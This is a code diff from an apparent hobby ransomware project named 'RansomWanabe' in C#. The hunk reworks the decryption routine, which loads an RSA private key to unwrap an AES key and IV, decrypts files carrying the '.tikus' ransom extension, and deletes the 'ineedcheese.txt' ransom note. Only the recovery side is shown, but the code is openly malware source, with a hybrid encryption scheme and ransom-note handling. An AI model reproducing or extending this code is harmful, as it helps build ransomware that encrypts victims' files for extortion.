@@ -244,51 +244,52 @@ namespace RansomWanabe
         {
             //var publicKey = GetKey.GetPublicKey();
 
-            var privateKey = GetKey.GetPrivateKey();
-
-            byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), privateKey);
-
-            byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), privateKey);
-
-            var baseDir = @"C:\Users\REUSER\Desktop\teloq";
+            var baseDir = @"C:\Users\ch4rm\Desktop\encme";
 
             string ransomFormat = ".tikus";
 
-        var blockList = new List<string> { "exe", "tikus", "key", "pub" };
-
-            var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
+            var blockList = new List<string> { "exe", "tikus", "key", "pub" };
 
             var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             var computerName = Environment.MachineName;
 
-            byte[] encrypted;
 
-            //decrypt with this
-            foreach (var file in targetDirs.Where(x=> x.EndsWith(ransomFormat)))
+            if (Directory.Exists(baseDir))
             {
-                var decryptedFile = Path.Combine(baseDir, $"{Path.GetFileNameWithoutExtension(file)}");
-                var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
-                var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
+                var targetDirs = Directory.EnumerateFiles(baseDir, "*.*", SearchOption.AllDirectories);
 
-                if (!File.Exists(decryptedFile))
+                var privateKey = GetKey.GetPrivateKey();
+
+                byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), privateKey);
+
+                byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), privateKey);
+
+                //decrypt with this
+                foreach (var file in targetDirs.Where(x => x.EndsWith(ransomFormat)))
                 {
-                    var fileContent = File.ReadAllBytes(file);
-                    
-                    File.Delete(file);
-                    
-                    //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
-                    var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
-                    
-                    File.WriteAllBytes(outputFile, decrypted);
+                    var decryptedFile = Path.Combine(baseDir, $"{Path.GetFileNameWithoutExtension(file)}");
+                    var outputFile = Path.Combine(Path.GetDirectoryName(file), Path.GetFileNameWithoutExtension(file));
+                    var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
 
-                    if (File.Exists(ransomNotePath))
-                        File.Delete(ransomNotePath);
-                    
+                    if (!File.Exists(decryptedFile))
+                    {
+                        var fileContent = File.ReadAllBytes(file);
+
+                        File.Delete(file);
+
+                        //var decrypted = Decompress(Asymmetric.RSA.Decrypt(fileContent, privateKey));
+                        var decrypted = AES.AESDecrypt(fileContent, aes_key, aes_iv);
+
+                        File.WriteAllBytes(outputFile, decrypted);
+
+                        if (File.Exists(ransomNotePath))
+                            File.Delete(ransomNotePath);
+
+                    }
+
                 }
-
             }
-
 
         }
     }
